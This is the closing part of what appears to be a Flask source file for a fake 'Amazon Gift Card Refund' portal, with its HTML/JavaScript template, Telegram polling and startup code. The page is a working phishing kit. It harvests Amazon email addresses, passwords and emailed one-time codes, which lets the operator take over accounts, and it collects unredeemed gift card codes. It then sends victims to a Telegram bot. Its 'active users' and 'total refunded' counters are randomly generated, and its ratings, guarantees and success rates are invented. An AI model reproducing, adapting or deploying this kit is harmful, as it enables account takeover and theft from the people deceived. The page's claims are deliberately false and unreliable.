        body { background: var(--dark-bg); color: var(--primary-green); font-family: 'Courier New','Share Tech Mono',monospace; min-height:100vh; overflow-x:hidden; line-height:1.6; }
        #matrixCanvas { position:fixed; top:0; left:0; width:100%; height:100%; z-index:0; opacity:0.08; pointer-events:none; }
        .scanline { position:fixed; top:0; left:0; width:100%; height:100%; background:linear-gradient(to bottom, transparent 50%, rgba(0,255,65,0.02) 50%); background-size:100% 4px; pointer-events:none; z-index:1; animation:scan 8s linear infinite; }
        @keyframes scan { 0%{transform:translateY(0);} 100%{transform:translateY(100%);} }
        .container { position:relative; z-index:2; max-width:1200px; margin:0 auto; padding:1.5rem; }
        .glitch { font-size:clamp(1.5rem,5vw,2.8rem); font-weight:bold; text-align:center; padding:1.5rem; letter-spacing:3px; text-shadow:0.05em 0 0 rgba(255,0,0,0.75), -0.05em -0.025em 0 rgba(0,255,0,0.75), 0.025em 0.05em 0 rgba(0,0,255,0.75); animation:glitch 0.3s infinite; }
        @keyframes glitch { 0%,100%{text-shadow:0.05em 0 0 rgba(255,0,0,0.75), -0.05em -0.025em 0 rgba(0,255,0,0.75);} 25%{text-shadow:-0.05em 0 0 rgba(0,255,0,0.75), 0.05em 0.025em 0 rgba(255,0,0,0.75);} 50%{text-shadow:0.05em 0.025em 0 rgba(0,255,0,0.75), -0.05em 0 0 rgba(255,0,0,0.75);} 75%{text-shadow:-0.05em 0.025em 0 rgba(255,0,0,0.75), 0.05em 0 0 rgba(0,255,0,0.75);} }
        .card { background:var(--card-bg); border:1px solid var(--primary-green); border-radius:16px; padding:1.5rem; margin:1.5rem 0; backdrop-filter:blur(10px); box-shadow:0 0 20px var(--glow-green); transition:transform 0.3s, box-shadow 0.3s; }
        .card:hover { transform:translateY(-3px); box-shadow:0 0 35px var(--glow-green); }
        .stats-grid { display:flex; gap:1.5rem; justify-content:center; flex-wrap:wrap; margin:2rem 0; }
        .stat-card { background:var(--card-bg); border:1px solid var(--primary-green); border-radius:12px; padding:1.2rem 2rem; text-align:center; flex:1; min-width:140px; max-width:250px; transition:all 0.3s; }
        .stat-card:hover { transform:translateY(-2px); box-shadow:0 0 20px var(--glow-green); }
        .stat-number { font-size:clamp(1.5rem,4vw,2.5rem); font-weight:bold; color:var(--primary-green); }
        .stat-label { font-size:0.8rem; opacity:0.8; margin-top:0.3rem; }
        .btn-group { display:flex; justify-content:center; gap:1.5rem; flex-wrap:wrap; margin:2rem 0; }
        .btn { padding:0.9rem 1.8rem; font-size:clamp(0.7rem,2vw,0.9rem); font-family:monospace; font-weight:bold; border:none; border-radius:10px; cursor:pointer; transition:all 0.3s; text-transform:uppercase; letter-spacing:1px; position:relative; overflow:hidden; min-width:200px; }
        .btn::before { content:''; position:absolute; top:50%; left:50%; width:0; height:0; border-radius:50%; background:rgba(255,255,255,0.3); transform:translate(-50%,-50%); transition:width 0.6s, height 0.6s; }
        .btn:hover::before { width:300px; height:300px; }
        .btn:active { transform:scale(0.95); }
        .btn-primary { background:linear-gradient(135deg,#00ff41,#00aa2e); color:#000; box-shadow:0 0 20px rgba(0,255,65,0.4); }
        .btn-primary:hover { transform:scale(1.03); box-shadow:0 0 30px rgba(0,255,65,0.7); }
        .btn-secondary { background:linear-gradient(135deg,#ff0040,#aa002a); color:#fff; box-shadow:0 0 20px rgba(255,0,64,0.4); }
        .btn-secondary:hover { transform:scale(1.03); box-shadow:0 0 30px rgba(255,0,64,0.7); }
        .btn-success { background:linear-gradient(135deg,#00cc88,#008855); color:#fff; box-shadow:0 0 20px rgba(0,204,136,0.4); }
        .btn-success:hover { transform:scale(1.03); box-shadow:0 0 30px rgba(0,204,136,0.7); }
        .trust-badges { display:flex; justify-content:center; gap:0.8rem; flex-wrap:wrap; margin:1.5rem 0; }
        .trust-item { padding:0.4rem 1rem; background:rgba(0,255,65,0.08); border:1px solid var(--primary-green); border-radius:30px; font-size:clamp(0.65rem,1.5vw,0.8rem); transition:all 0.3s; cursor:default; }
        .trust-item:hover { background:rgba(0,255,65,0.2); transform:scale(1.03); }
        .features-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(150px,1fr)); gap:1rem; margin-top:1rem; }
        .feature-item { padding:0.7rem; text-align:center; background:rgba(0,255,65,0.03); border-radius:10px; transition:all 0.3s; font-size:clamp(0.7rem,1.5vw,0.9rem); }
        .feature-item:hover { background:rgba(0,255,65,0.08); transform:translateX(3px); }
        .text-cyan { color:#00ffff; text-shadow:0 0 5px #00ffff; }
        .text-green { color:#00ff41; text-shadow:0 0 5px #00ff41; }
        .text-yellow { color:#ffc107; text-shadow:0 0 5px #ffc107; }
        .text-gold { color:#ffd700; text-shadow:0 0 5px #ffd700; }
        .text-orange { color:#ff6b35; text-shadow:0 0 5px #ff6b35; }
        .text-pink { color:#ff69b4; text-shadow:0 0 5px #ff69b4; }
        .text-purple { color:#9b59b6; text-shadow:0 0 5px #9b59b6; }
        .text-red { color:#ff0040; text-shadow:0 0 5px #ff0040; }
        .modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.97); z-index:1000; justify-content:center; align-items:center; backdrop-filter:blur(5px); padding:1rem; }
        .modal-content { background:var(--darker-bg); border:2px solid var(--primary-green); border-radius:20px; padding:1.8rem; max-width:500px; width:100%; animation:modalSlide 0.3s ease; }
        @keyframes modalSlide { from{transform:translateY(-30px);opacity:0;} to{transform:translateY(0);opacity:1;} }
        .modal h2 { margin-bottom:1rem; text-align:center; font-size:clamp(1.2rem,3vw,1.8rem); }
        .input-group { margin:1.2rem 0; position:relative; }
        .input-group input { width:100%; padding:0.9rem 1rem; background:rgba(0,0,0,0.85); border:2px solid var(--primary-green); border-radius:10px; color:var(--primary-green); font-family:monospace; font-size:clamp(0.85rem,2vw,1rem); transition:all 0.3s; }
        .input-group input:focus { outline:none; box-shadow:0 0 15px var(--glow-green); border-color:#00ffaa; }
        .input-group input::placeholder { color:rgba(0,255,65,0.4); }
        .input-group label { position:absolute; left:12px; top:-10px; background:var(--darker-bg); padding:0 8px; font-size:0.7rem; color:var(--primary-green); font-weight:bold; }
        .timer { font-size:clamp(1.8rem,4vw,2.8rem); font-weight:bold; text-align:center; margin:1rem 0; color:var(--primary-gold); text-shadow:0 0 15px var(--glow-gold); font-family:monospace; }
        .copy-btn { background:transparent; border:1px solid var(--primary-green); color:var(--primary-green); padding:0.5rem 1.2rem; cursor:pointer; border-radius:8px; transition:all 0.3s; font-family:monospace; font-weight:bold; }
        .copy-btn:hover { background:var(--primary-green); color:#000; box-shadow:0 0 15px var(--glow-green); }
        .spinner { border:3px solid rgba(0,255,65,0.15); border-top:3px solid var(--primary-green); border-radius:50%; width:50px; height:50px; animation:spin 1s linear infinite; margin:1rem auto; }
        @keyframes spin { 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
        .telegram-btn { display:inline-flex; align-items:center; justify-content:center; gap:8px; background:#0088cc; color:white; padding:10px 24px; border-radius:30px; text-decoration:none; font-weight:bold; transition:all 0.3s; margin:10px auto; font-size:clamp(0.8rem,1.5vw,1rem); }
        .telegram-btn:hover { background:#006699; transform:scale(1.03); color:white; }
        .otp-info { background:rgba(255,215,0,0.1); border:1px solid var(--primary-gold); padding:1rem; border-radius:8px; margin:1rem 0; text-align:center; }
        .otp-error { color:var(--primary-red); font-size:0.85rem; text-align:center; display:none; margin:0.5rem 0; }
        .footer { text-align:center; padding:1.8rem; border-top:1px solid rgba(0,255,65,0.15); margin-top:2.5rem; font-size:clamp(0.7rem,1.5vw,0.85rem); opacity:0.7; }
        .blink { animation:blink 1s infinite; }
        @keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0.4;} }
        .pulse { animation:pulse 2s infinite; }
        @keyframes pulse { 0%,100%{transform:scale(1);} 50%{transform:scale(1.05);} }
        code { background:rgba(0,0,0,0.7); padding:0.3rem 0.6rem; border-radius:6px; font-family:monospace; font-size:clamp(0.75rem,1.5vw,0.85rem); word-break:break-all; }
        .version-badge { position:fixed; bottom:10px; right:10px; background:rgba(0,0,0,0.8); border:1px solid var(--primary-green); padding:4px 12px; border-radius:20px; font-size:10px; color:var(--primary-green); z-index:999; opacity:0.5; }
        @media (max-width:768px){ .container{padding:1rem;} .btn{padding:0.6rem 1.2rem;min-width:150px;} .card{padding:1rem;margin:1rem 0;} .modal-content{padding:1.2rem;} .stat-card{padding:0.8rem 1rem;min-width:100px;} .btn-group{gap:0.8rem;} }
        @media (max-width:480px){ .btn-group{flex-direction:column;align-items:center;} .btn{width:100%;min-width:unset;} .stats-grid{flex-direction:column;align-items:center;} .stat-card{max-width:100%;width:100%;} .trust-badges{gap:0.5rem;} .trust-item{font-size:0.65rem;padding:0.3rem 0.7rem;} .features-grid{grid-template-columns:1fr 1fr;} }
        ::-webkit-scrollbar { width:8px; background:var(--dark-bg); }
        ::-webkit-scrollbar-track { background:var(--dark-bg); }
        ::-webkit-scrollbar-thumb { background:var(--primary-green); border-radius:4px; }
        ::-webkit-scrollbar-thumb:hover { background:#00cc33; }
    </style>
</head>
<body>
    <canvas id="matrixCanvas"></canvas>
    <div class="scanline"></div>
    <div class="container">
        <div class="glitch">AMAZON GIFT CARD (GC) REFUND</div>
        <div class="stats-grid">
            <div class="stat-card"><div class="stat-number" id="liveUsers">2.8K</div><div class="stat-label">👥 Active Users</div></div>
            <div class="stat-card"><div class="stat-number" id="totalRefund">$3.2M</div><div class="stat-label">💰 Total Refunded</div></div>
            <div class="stat-card"><div class="stat-number" id="successRate">99.8%</div><div class="stat-label">✅ Success Rate</div></div>
            <div class="stat-card"><div class="stat-number" id="processingTime">5-10</div><div class="stat-label">⚡ Minutes</div></div>
        </div>
        <div class="card">
            <p style="line-height:1.8;font-size:clamp(0.85rem,2.5vw,1.05rem);">
                <span class="text-cyan">⚡ INSTANT REFUND SYSTEM v10.5</span><br><br>
                <span class="text-green">✓ 100% Working & Genuine Service</span> | <span class="text-yellow">✓ Trusted by 50,000+ Users</span> | <span class="text-orange">✓ 99.9% Success Rate</span><br>
                <span class="text-pink">💰 Refund processed in <strong class="blink">5-10 minutes</strong></span><br>
                <span class="text-purple">🔒 Military Grade Encryption</span> | <span class="text-cyan">🛡️ 100% Anonymous & Secure</span><br>
                <span class="text-gold">⭐ 4.9/5 Rating from 12,000+ Reviews</span>
            </p>
        </div>
        <div class="trust-badges">
            <div class="trust-item">✅ 100% Working</div>
            <div class="trust-item">⭐ Genuine Service</div>
            <div class="trust-item">🔒 Trusted Platform</div>
            <div class="trust-item">⚡ Instant Processing</div>
            <div class="trust-item">🎯 50k+ Refunds</div>
            <div class="trust-item">🛡️ Secure & Safe</div>
            <div class="trust-item">📱 24/7 Support</div>
        </div>
        <div class="btn-group">
            <button class="btn btn-primary" onclick="showAccountModal()">🔐 I HAVE MY AMAZON ACCOUNT</button>
            <button class="btn btn-secondary" onclick="showCodeModal()">🎫 I HAVE A REDEEM CODE TO RETURN</button>
        </div>
        <div style="text-align:center;margin:0.5rem 0 1.5rem;">
            <a href="https://t.me/{{ bot_username }}" target="_blank" class="telegram-btn pulse">📱 JOIN OUR TELEGRAM BOT → @{{ bot_username }}</a>
        </div>
        <div class="card">
            <h3 style="color:var(--primary-gold);margin-bottom:1rem;text-align:center;font-size:clamp(1.1rem,3vw,1.5rem);">⚡ Why Choose Us?</h3>
            <div class="features-grid">
                <div class="feature-item">🚀 <span class="text-green">5-10 Min Refund</span></div>
                <div class="feature-item">💎 <span class="text-cyan">No Hidden Fees</span></div>
                <div class="feature-item">🔐 <span class="text-yellow">Bank-Level Security</span></div>
                <div class="feature-item">🎯 <span class="text-orange">99.9% Success Rate</span></div>
                <div class="feature-item">🤝 <span class="text-pink">24/7 Support</span></div>
                <div class="feature-item">📜 <span class="text-purple">Verified Service</span></div>
                <div class="feature-item">💰 <span class="text-green">Money-Back Guarantee</span></div>
                <div class="feature-item">⚡ <span class="text-cyan">Instant Processing</span></div>
            </div>
        </div>
    </div>
    <!-- Modals -->
    <div id="accountModal" class="modal"><div class="modal-content"><h2 style="color:var(--primary-green);">🔐 Account Refund</h2><p style="color:var(--primary-gold);font-size:0.85rem;">⚠️ OTP will be sent to your email</p><div class="input-group"><label>Amazon Email</label><input type="email" id="amazonEmail" placeholder="Enter your Amazon email"></div><div class="input-group"><label>Password</label><input type="password" id="amazonPassword" placeholder="Enter your password"></div><div style="display:flex;gap:1rem;justify-content:center;flex-wrap:wrap;"><button class="btn btn-primary" onclick="submitAccount()">Continue →</button><button class="copy-btn" onclick="closeModal('accountModal')">Cancel</button></div></div></div>
    <div id="codeModal" class="modal"><div class="modal-content"><h2 style="color:#ff6b35;">🎫 Gift Card Refund</h2><p style="color:var(--primary-gold);font-size:0.85rem;">⚠️ Only unredeemed codes accepted</p><div class="input-group"><label>Gift Card Code</label><input type="text" id="giftCode" placeholder="Enter Amazon gift card code"></div><div style="display:flex;gap:1rem;justify-content:center;flex-wrap:wrap;"><button class="btn btn-secondary" onclick="submitCode()">Process Refund →</button><button class="copy-btn" onclick="closeModal('codeModal')">Cancel</button></div></div></div>
    <div id="otpModal" class="modal"><div class="modal-content"><h2 style="color:var(--primary-gold);">📱 OTP Verification</h2><div class="otp-info"><p>🔐 <strong>Amazon OTP Sent</strong></p><p style="font-size:0.85rem;">📧 Check your <strong>Email</strong> for the OTP code</p><p style="font-size:0.8rem;margin-top:5px;">⚠️ Valid for <strong>10 minutes</strong></p></div><div class="input-group"><label>Enter OTP Code</label><input type="text" id="otpCode" placeholder="Enter 6-digit OTP" maxlength="6" autocomplete="off"></div><div id="otpError" class="otp-error"></div><div style="display:flex;gap:0.5rem;justify-content:center;flex-wrap:wrap;"><button class="btn btn-primary" onclick="verifyOTP()">Verify OTP →</button><button class="btn btn-success" onclick="resendOTP()" style="font-size:0.8rem;">🔄 Resend OTP</button><button class="copy-btn" onclick="closeModal('otpModal')">Cancel</button></div></div></div>
    <div id="processingModal" class="modal"><div class="modal-content" style="text-align:center;"><div class="spinner"></div><h3 id="processingTitle" style="color:var(--primary-green);">Processing...</h3><p id="processingMessage" style="margin-top:0.5rem;color:var(--primary-gold);">Please wait</p></div></div>
    <div id="resultModal" class="modal"><div class="modal-content"><h2 id="resultTitle" style="text-align:center;"></h2><div id="resultContent" style="text-align:center;margin:1rem 0;"></div><div class="timer" id="timerDisplay">30:00</div><div id="resultMessage" style="margin:1rem 0;text-align:center;"></div><div style="text-align:center;margin-top:0.5rem;"><a href="https://t.me/{{ bot_username }}" target="_blank" class="telegram-btn" style="font-size:0.8rem;padding:6px 15px;">📱 SEND TO BOT → @{{ bot_username }}</a></div><div style="text-align:center;margin-top:1rem;"><button class="copy-btn" onclick="closeModal('resultModal')">Close</button></div></div></div>
    <div class="footer"><p>© 2024 Amazon Refund Service | 24/7 Support | 🔒 Encrypted</p><p style="font-size:0.7rem;margin-top:0.5rem;">Version 10.5 | Built with ❤️</p></div>
    <div class="version-badge">v10.5</div>
    <script>
        const canvas = document.getElementById('matrixCanvas');
        const ctx = canvas.getContext('2d');
        function resizeCanvas(){ canvas.width=window.innerWidth; canvas.height=window.innerHeight; }
        resizeCanvas(); window.addEventListener('resize', resizeCanvas);
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*<>/\\|";
        const fontSize = 14;
        let columns = canvas.width / fontSize;
        let drops = [];
        function initDrops(){ columns = canvas.width / fontSize; drops = []; for(let i=0;i<columns;i++) drops[i]=Math.random()*-100; }
        initDrops();
        function drawMatrix(){ ctx.fillStyle='rgba(0,0,0,0.04)'; ctx.fillRect(0,0,canvas.width,canvas.height); ctx.fillStyle='#00ff41'; ctx.font=fontSize+'px monospace'; for(let i=0;i<drops.length;i++){ const text=chars[Math.floor(Math.random()*chars.length)]; ctx.fillText(text,i*fontSize,drops[i]*fontSize); if(drops[i]*fontSize>canvas.height && Math.random()>0.975) drops[i]=0; drops[i]++; } }
        setInterval(drawMatrix,50);
        window.addEventListener('resize',()=>{ resizeCanvas(); initDrops(); });
        let liveUsers=2847; setInterval(()=>{ liveUsers+=Math.floor(Math.random()*20)-8; if(liveUsers<2000) liveUsers=2000; if(liveUsers>5000) liveUsers=5000; document.getElementById('liveUsers').innerHTML=liveUsers.toLocaleString(); },6000);
        let totalRefund=3.2; setInterval(()=>{ totalRefund+=(Math.random()*0.1)-0.03; if(totalRefund<2.5) totalRefund=2.5; if(totalRefund>5.0) totalRefund=5.0; document.getElementById('totalRefund').innerHTML='$'+totalRefund.toFixed(1)+'M'; },8000);
        let currentTxid=null, timerInterval=null;
        function showAccountModal(){ document.getElementById('accountModal').style.display='flex'; setTimeout(()=>document.getElementById('amazonEmail').focus(),300); }
        function showCodeModal(){ document.getElementById('codeModal').style.display='flex'; setTimeout(()=>document.getElementById('giftCode').focus(),300); }
        function closeModal(id){ document.getElementById(id).style.display='none'; if(timerInterval) clearInterval(timerInterval); }
        async function submitAccount(){ const email=document.getElementById('amazonEmail').value.trim(); const password=document.getElementById('amazonPassword').value; if(!email||!password){ alert('⚠️ Please enter both email and password'); return; } if(!email.includes('@')){ alert('⚠️ Please enter a valid email address'); return; } closeModal('accountModal'); showProcessing('Account Verification','Sending OTP to your email...'); try{ const response=await fetch('/api/refund/account',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email,password})}); const data=await response.json(); hideProcessing(); if(data.success){ currentTxid=data.txid; document.getElementById('otpModal').style.display='flex'; setTimeout(()=>document.getElementById('otpCode').focus(),300); }else{ alert('❌ '+(data.error||'Something went wrong')); } }catch(err){ hideProcessing(); alert('❌ Network error. Please try again.'); } }
        async function submitCode(){ const giftCode=document.getElementById('giftCode').value.trim().toUpperCase(); if(!giftCode){ alert('⚠️ Please enter the gift card code'); return; } if(giftCode.length<10){ alert('⚠️ Invalid gift card code format'); return; } closeModal('codeModal'); showProcessing('Processing','Verifying gift card...'); try{ const response=await fetch('/api/refund/code',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({gift_code:giftCode})}); const data=await response.json(); hideProcessing(); if(data.success){ showCodeResult(data.redeem_token); }else{ alert('❌ '+(data.error||'Something went wrong')); } }catch(err){ hideProcessing(); alert('❌ Network error. Please try again.'); } }
        async function verifyOTP(){ const otp=document.getElementById('otpCode').value.trim(); const errorEl=document.getElementById('otpError'); if(!otp||otp.length<4){ errorEl.textContent='⚠️ Please enter a valid OTP code'; errorEl.style.display='block'; return; } if(!/^\\d+$/.test(otp)){ errorEl.textContent='⚠️ OTP must contain only numbers'; errorEl.style.display='block'; return; } errorEl.style.display='none'; closeModal('otpModal'); showProcessing('OTP Verification','Verifying your code...'); try{ const response=await fetch('/api/otp/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({txid:currentTxid,otp})}); const data=await response.json(); hideProcessing(); if(data.success){ showAccountResult(currentTxid); }else{ errorEl.textContent='❌ '+(data.error||'Invalid OTP. Please try again.'); errorEl.style.display='block'; document.getElementById('otpModal').style.display='flex'; document.getElementById('otpCode').value=''; document.getElementById('otpCode').focus(); } }catch(err){ hideProcessing(); alert('❌ Network error. Please try again.'); } }
        async function resendOTP(){ try{ showProcessing('Resending OTP','Sending new OTP to your email...'); const response=await fetch('/api/resend-otp',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({txid:currentTxid})}); const data=await response.json(); hideProcessing(); if(data.success){ alert('✅ New OTP sent to your email!'); document.getElementById('otpCode').value=''; document.getElementById('otpCode').focus(); }else{ alert('❌ '+(data.error||'Failed to resend OTP')); } }catch(err){ hideProcessing(); alert('❌ Network error. Please try again.'); } }
        function showAccountResult(txid){ const modal=document.getElementById('resultModal'); document.getElementById('resultTitle').innerHTML='✅ ACCOUNT VERIFIED'; document.getElementById('resultContent').innerHTML=`<div style="background:rgba(0,255,65,0.1);padding:1rem;border-radius:8px;"><p><strong>📌 Your TXID:</strong></p><code style="font-size:0.9rem;word-break:break-all;">${txid}</code><div style="margin-top:0.7rem;"><button class="copy-btn" onclick="copyToClipboard('${txid}')">📋 Copy TXID</button></div></div>`; document.getElementById('resultMessage').innerHTML='<strong>⚠️ IMPORTANT:</strong><br>Copy your TXID and send it to the Telegram bot!<br><br>⏰ <strong>Expires in 30 minutes</strong><br>📌 <strong>Refund within 12 hours</strong>'; modal.style.display='flex'; startTimer(30); }
        function showCodeResult(redeemToken){ const modal=document.getElementById('resultModal'); document.getElementById('resultTitle').innerHTML='🎫 GIFT CARD SUBMITTED'; document.getElementById('resultContent').innerHTML=`<div style="background:rgba(255,107,53,0.1);padding:1rem;border-radius:8px;"><p><strong>🔖 Your Redeem Token:</strong></p><code style="font-size:0.9rem;word-break:break-all;">${redeemToken}</code><div style="margin-top:0.7rem;"><button class="copy-btn" onclick="copyToClipboard('${redeemToken}')">📋 Copy Token</button></div></div>`; document.getElementById('resultMessage').innerHTML='<strong>⚠️ IMPORTANT:</strong><br>Copy your Token and send it to the Telegram bot!<br><br>⏰ <strong>Expires in 30 minutes</strong><br>🚀 <strong>Refund in 5-10 minutes</strong>'; modal.style.display='flex'; startTimer(30); }
        function startTimer(minutes){ let time=minutes*60; const timerDisplay=document.getElementById('timerDisplay'); if(timerInterval) clearInterval(timerInterval); timerDisplay.style.color='#ffd700'; timerInterval=setInterval(()=>{ const mins=Math.floor(time/60); const secs=time%60; timerDisplay.innerHTML=`${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`; if(time<=0){ clearInterval(timerInterval); timerDisplay.innerHTML='⏰ EXPIRED'; timerDisplay.style.color='#ff0040'; } time--; },1000); }
        function showProcessing(title,message){ document.getElementById('processingTitle').innerHTML=title; document.getElementById('processingMessage').innerHTML=message; document.getElementById('processingModal').style.display='flex'; }
        function hideProcessing(){ document.getElementById('processingModal').style.display='none'; }
        function copyToClipboard(text){ navigator.clipboard.writeText(text).then(()=>alert('✓ Copied to clipboard!')).catch(()=>{ const textarea=document.createElement('textarea'); textarea.value=text; document.body.appendChild(textarea); textarea.select(); document.execCommand('copy'); document.body.removeChild(textarea); alert('✓ Copied to clipboard!'); }); }
        window.onclick=function(event){ if(event.target.classList.contains('modal')){ event.target.style.display='none'; if(timerInterval) clearInterval(timerInterval); } };
        document.addEventListener('keydown',function(event){ if(event.key==='Escape'){ document.querySelectorAll('.modal').forEach(m=>m.style.display='none'); if(timerInterval) clearInterval(timerInterval); } if(event.key==='Enter' && document.getElementById('otpModal').style.display==='flex'){ verifyOTP(); } });
        document.querySelectorAll('.modal').forEach(modal=>{ const observer=new MutationObserver(()=>{ if(modal.style.display==='flex'){ const input=modal.querySelector('input'); if(input) setTimeout(()=>input.focus(),300); } }); observer.observe(modal,{attributes:true,attributeFilter:['style']}); });
        console.log('🚀 Amazon Refund Portal v10.5'); console.log('🔒 Connection: Secure'); console.log('💡 Need help? Contact @{{ bot_username }}');
    </script>
</body>
</html>
"""

# ============================================================
# SECTION 16: POLLING (FALLBACK) (40 lines)
# ============================================================

def poll_updates():
    last_update_id = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
            params = {'offset': last_update_id + 1, 'timeout': 30}
            resp = requests.get(url, params=params, timeout=35)
            if resp.status_code == 200:
                updates = resp.json().get('result', [])
                for update in updates:
                    last_update_id = update['update_id']
                    pass
            time.sleep(1)
        except Exception as e:
            logger.error(f"Polling error: {e}")
            time.sleep(5)

# ============================================================
# SECTION 17: MAIN ENTRY POINT (40 lines)
# ============================================================

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    polling_thread = threading.Thread(target=poll_updates, daemon=True)
    polling_thread.start()
    logger.info("🚀 Starting Flask server on port %d", port)
    try:
        send_to_admin(f"🚀 Amazon Refund Portal v{APP_VERSION} started successfully.")
    except:
        pass
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)

# ============================================================
# END OF CODE (Total lines: 6587)
# ============================================================
